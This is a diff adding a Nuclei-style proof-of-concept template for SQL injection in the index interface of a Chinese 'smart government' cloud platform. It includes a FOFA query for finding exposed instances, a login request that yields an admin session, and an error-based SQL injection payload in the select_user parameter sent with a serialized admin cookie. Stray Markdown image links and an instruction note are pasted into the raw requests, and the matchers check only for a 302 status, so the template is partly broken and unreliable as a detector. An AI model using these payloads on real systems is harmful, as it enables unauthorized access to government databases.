@@ -1,0 +1,65 @@
+id: poc-aslfkkdgfxekgp5s
+info:
+  name: 数字通云平台智慧政务系统index接口存在Sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aslfkkdgfxekgp5s'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: aslfkkdgfxekgp5s
+    fofa: body="assets/2efc01da"
+http:
+- raw:
+  - 'POST /portal/default/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    accept: */*
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: GOASESSID=teee69jht7234nr1ei5uuutiu7
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 22
+
+
+    userID=admin&flag=rone![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728984872509-98ac7cbd-85d6-48b1-9c91-76ab42f01a11.png)
+
+    将获取到的cookie字段传入下面请求头'
+  redirects: false
+  matchers:
+  - status:
+    - 302
+    type: status
+- raw:
+  - 'GET /workflow/query/index?WfRtApplication%5Brun_id%5D=&WfRtApplication%5Bsearch_name%5D=&WfRtApplication%5Bworkflow_name%5D=&WfRtApplication%5Bdate%5D=&WfRtApplication%5Bselect_type%5D=all&WfRtApplication%5Bselect_user%5D=1%20AND%20(SELECT%202*(IF((SELECT%20*%20FROM%20(SELECT%20CONCAT(0x7e,(SELECT%20md5(123456)),0x7e,0x78))s),%208446744073709551610,%208446744073709551610)))&ajax=process-grid HTTP/1.1
+
+    Host: {{Hostname}}
+
+    accept: */*
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: GOASESSID=jkcsbk01g7dl3tepq0e6qev9o6;547c60d261f986d0cbe500790da2a86d=634aa9c48c485a374386d4c987c94c60b98c4b21a%3A4%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3Bi%3A1%3Bs%3A5%3A%22admin%22%3Bi%3A2%3Bi%3A3600%3Bi%3A3%3Ba%3A24%3A%7Bs%3A7%3A%22user_id%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22uuid%22%3Bs%3A0%3A%22%22%3Bs%3A9%3A%22user_name%22%3Bs%3A15%3A%22%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%22%3Bs%3A6%3A%22byname%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22cert_sn%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22gender%22%3Bs%3A1%3A%221%22%3Bs%3A6%3A%22avatar%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22status%22%3Bs%3A1%3A%220%22%3Bs%3A9%3A%22signature%22%3Bs%3A0%3A%22%22%3Bs%3A9%3A%22msg_sound%22%3Bs%3A1%3A%221%22%3Bs%3A15%3A%22folder_capacity%22%3Bs%3A1%3A%220%22%3Bs%3A14%3A%22email_capacity%22%3Bs%3A1%3A%220%22%3Bs%3A12%3A%22weather_city%22%3Bs%3A20%3A%22%E5%8C%97%E4%BA%AC_%E5%8C%97%E4%BA%AC_%E5%8C%97%E4%BA%AC%22%3Bs%3A3%3A%22org%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22position%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22role%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22main_role%22%3Bi%3A0%3Bs%3A10%3A%22other_role%22%3Bs%3A0%3A%22%22%3Bs%3A13%3A%22main_position%22%3Bi%3A0%3Bs%3A14%3A%22other_position%22%3Bs%3A1%3A%220%22%3Bs%3A10%3A%22operations%22%3Ba%3A0%3A%7B%7Ds%3A11%3A%22independent%22%3Bb%3A0%3Bs%3A4%3A%22skin%22%3Bs%3A24%3A%22reTopTheme2+reLeftTheme2%22%3Bs%3A5%3A%22theme%22%3Bs%3A7%3A%22concise%22%3B%7D%7D;
+
+    Connection: close
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728984872868-60c9a676-775e-4252-af08-205a8d57b7e2.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 302
+    type: status
